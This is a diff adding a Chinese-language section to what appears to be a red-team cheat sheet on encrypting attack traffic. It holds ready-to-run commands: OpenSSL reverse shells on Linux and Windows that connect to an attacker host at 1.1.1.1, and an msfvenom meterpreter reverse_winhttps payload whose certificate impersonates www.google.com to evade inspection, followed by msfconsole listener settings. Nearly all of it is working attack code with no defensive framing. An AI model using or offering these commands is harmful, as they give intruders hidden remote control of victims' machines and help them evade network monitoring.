@@ -113,6 +113,83 @@ wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x8
 socat file:`tty`,raw,echo=0 tcp-listen:9999
 ```
 
+### 流量加密
+
+#### openssl加密反弹shell
+
+##### linux单向ssl
+
+1.攻击机生成
+
+```
+openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes
+
+-newkey rsa:2048选项声明了使用RAS算法生成2048位的私钥。
+-nodes选项表明我们不使用密码加密私钥。
+-keyout key.key:生成私钥
+-out cert.pem：生成pem证书
+```
+
+2.攻击机监听反弹shell
+
+```
+openssl s_server -quiet -key key.pem -cert cert.pem -port 9001
+```
+
+3.受害机执行
+
+```
+mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 1.1.1.1:9001 > /tmp/s; rm /tmp/s
+```
+
+##### linux双向ssl加密
+
+https://blog.csdn.net/go_home_look/article/details/107238103
+
+##### windowsssl加密
+
+1.受害机开启两个监听，从 ip:port1 获取命令发送给 cmd.exe执行，然后结果返回到 ip:port2。
+
+```
+openssl s_server -quiet -key key.pem -cert cert.pem -port 443
+openssl s_server -quiet -key key.pem -cert cert.pem -port 445
+```
+
+2.攻击机执行
+
+```
+openssl s_client -quiet -connect 1.1.1.1:443 | cmd.exe | openssl s_client -quiet -connect 1.1.1.1:445
+```
+
+之后python获取完全交互的shell
+
+
+
+#### msf监听流量加密
+
+
+
+```
+openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 -subj "/C=UK/ST=London/L=London/O=Development/CN=www.google.com" -keyout www.google.com.key -out www.google.com.crt && cat www.google.com.key www.google.com.crt > www.google.com.pem 
+```
+
+```
+msfvenom -p windows/meterpreter/reverse_winhttps LHOST=192.168.1.105 LPORT=443 PayloadUUIDTracking=true HandlerSSLCert=www.google.com.pem StagerVerifySSLCert=true PayloadUUIDName=ParanoidStagedPSH -f exe -o msf.exe
+```
+
+##### msfconsole
+
+配置监听器需要使用两个附加选项。这是为了通知处理程序它将使用的证书（与有效负载相同），并在接受到链接时执行SSL证书验证。
+
+```
+set payload windows/meterpreter/reverse_winhttps
+set LHOST 192.168.1.105
+set LPORT 443
+set HandlerSSLCert /home/kali/Downloads/www.google.com.pem
+set StagerVerifySSLCert true 
+exploit
+```
+
 
 
 ### 提权
